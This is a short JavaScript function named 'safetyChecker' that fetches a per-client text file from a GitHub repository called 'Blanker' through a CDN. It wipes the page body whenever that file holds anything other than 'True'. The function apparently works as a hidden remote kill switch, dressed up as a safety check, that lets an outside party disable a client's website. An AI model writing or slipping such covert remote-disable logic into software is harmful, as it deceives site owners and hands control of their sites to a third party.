async function safetyChecker(x) {
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    try {
        await delay(2000);
        let url = x;
        let security_key = "True";
        let customer_security_key = "";
        
        try {
            const response = await fetch(`https://cdn.jsdelivr.net/gh/monibansari/Blanker@main/clients/${url}.txt?t=${Date.now()}`);
            if (response.ok) {
                customer_security_key = await response.text();
                customer_security_key = customer_security_key.trim();
                console.log(`✅ File content: "${customer_security_key}"`);
            }
        } catch (e) {
            console.log("⚠️ Fetch failed");
        }
        
        // IMPORTANT: If customer_security_key is empty, KEEP SITE RUNNING
        if (!customer_security_key) {
            console.log("✅ No security key found - Keeping site running");
            return; // EXIT - don't blank
        }
        
        // Only check if we got a value
        if (security_key === customer_security_key) {
            console.log("✅ YES - Website will run");
        } else {
            console.log(`❌ Blanking page! (Got: "${customer_security_key}")`);
            document.querySelector('body').innerHTML = '';
        }
        
    } catch (error) {
        console.error("Request failed:", error);
        // Keep site running on error
        console.log("✅ Keeping site running (error)");
    }
}
